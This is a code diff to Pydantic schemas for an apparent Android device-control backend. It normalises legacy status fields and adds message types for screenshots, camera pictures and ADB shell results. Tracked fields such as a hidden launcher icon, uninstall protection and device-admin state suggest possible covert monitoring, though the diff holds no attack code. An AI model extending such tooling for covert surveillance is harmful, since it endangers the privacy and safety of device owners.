@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+import uuid
 from typing import Any, Literal
 
 from pydantic import BaseModel, ConfigDict, Field, field_validator, model_validator
@@ -74,6 +75,11 @@ class DeviceUpdateRequest(StrictModel):
 
 
 class DeviceStatusRequest(StrictModel):
+    # Legacy deviceOnline/diag payloads contain device metadata next to status
+    # fields. Ignore that metadata here, most importantly deviceInfo.screen,
+    # which is a display dimension rather than an interactive-screen state.
+    model_config = ConfigDict(extra="ignore")
+
     battery_percent: int | None = Field(default=None, ge=0, le=100)
     charging: bool | None = None
     network_type: str | None = Field(default=None, max_length=40)
@@ -81,6 +87,7 @@ class DeviceStatusRequest(StrictModel):
     network_latency_ms: int | None = Field(default=None, ge=0, le=60000)
     screen_state: Literal["on", "off", "locked", "unknown"] | None = None
     locked: bool | None = None
+    lock_state_code: int | None = Field(default=None, ge=0, le=3)
     accessibility_enabled: bool | None = None
     battery_whitelist_enabled: bool | None = None
     device_admin_enabled: bool | None = None
@@ -89,6 +96,94 @@ class DeviceStatusRequest(StrictModel):
     uninstall_protection_enabled: bool | None = None
     launcher_icon_visible: bool | None = None
     reported_at: str | None = Field(default=None, max_length=40)
+
+    @model_validator(mode="before")
+    @classmethod
+    def normalize_legacy_status(cls, value: Any) -> Any:
+        if not isinstance(value, dict):
+            return value
+        data = dict(value)
+
+        def use_alias(target: str, *aliases: str) -> None:
+            if data.get(target) is not None:
+                return
+            for alias in aliases:
+                if data.get(alias) is not None:
+                    data[target] = data[alias]
+                    return
+
+        def legacy_bool(raw: Any) -> bool | Any:
+            if isinstance(raw, str):
+                normalized = raw.strip().lower()
+                if normalized in {"1", "true", "yes", "on", "active", "activated", "enabled"}:
+                    return True
+                if normalized in {"0", "false", "no", "off", "inactive", "deactivated", "disabled"}:
+                    return False
+            return raw
+
+        use_alias("battery_percent", "battery")
+        use_alias("network_type", "netstate", "network")
+        use_alias("accessibility_enabled", "acc", "acc_status")
+        use_alias(
+            "battery_whitelist_enabled",
+            "battery_whitelist",
+            "ignoring_battery_opt",
+        )
+
+        battery = data.get("battery_percent")
+        if isinstance(battery, str):
+            data["battery_percent"] = battery.strip().removesuffix("%").strip()
+
+        network_type = data.get("network_type")
+        if isinstance(network_type, str):
+            data["network_type"] = network_type.strip().lower()
+
+        for field in (
+            "charging",
+            "accessibility_enabled",
+            "battery_whitelist_enabled",
+            "device_admin_enabled",
+        ):
+            if field in data:
+                data[field] = legacy_bool(data[field])
+
+        lock_value = data.get("lock_state_code", data.get("lock"))
+        if isinstance(lock_value, str):
+            lock_value = lock_value.strip()
+        try:
+            lock_code = int(lock_value) if lock_value is not None else None
+        except (TypeError, ValueError):
+            lock_code = lock_value
+        if lock_code is not None:
+            data["lock_state_code"] = lock_code
+            if lock_code == 0:
+                data.setdefault("screen_state", "off")
+            elif lock_code == 1:
+                data.setdefault("screen_state", "locked")
+                data.setdefault("locked", True)
+            elif lock_code in {2, 3}:
+                data.setdefault("screen_state", "on")
+                data.setdefault("locked", False)
+
+        diag_name = (
+            data.get("diag")
+            or data.get("diagnostic")
+            or data.get("type")
+            or data.get("name")
+            or data.get("category")
+        )
+        diag_state = (
+            data.get("status")
+            if data.get("status") is not None
+            else data.get("state", data.get("value", data.get("message")))
+        )
+        if isinstance(diag_name, str) and "device_admin" in diag_name.lower():
+            if diag_state is None and "/" in diag_name:
+                diag_state = diag_name.rsplit("/", 1)[-1]
+            if diag_state is not None and data.get("device_admin_enabled") is None:
+                data["device_admin_enabled"] = legacy_bool(diag_state)
+
+        return data
 
 
 class DeviceLogRequest(StrictModel):
@@ -188,10 +283,19 @@ class DeviceSocketMessage(StrictModel):
         "device.hello",
         "device.heartbeat",
         "device.status",
+        "deviceOnline",
+        "diag",
         "command.ack",
         "command.result",
+        "screenshot",
+        "adbScreenshot",
+        "camPic",
+        "relayStatus",
+        "adbShellResult",
         "screen.session.status",
     ]
-    message_id: str = Field(min_length=8, max_length=160)
+    message_id: str = Field(
+        default_factory=lambda: str(uuid.uuid4()), min_length=8, max_length=160
+    )
     correlation_id: str | None = Field(default=None, max_length=160)
     payload: dict[str, Any] = Field(default_factory=dict)
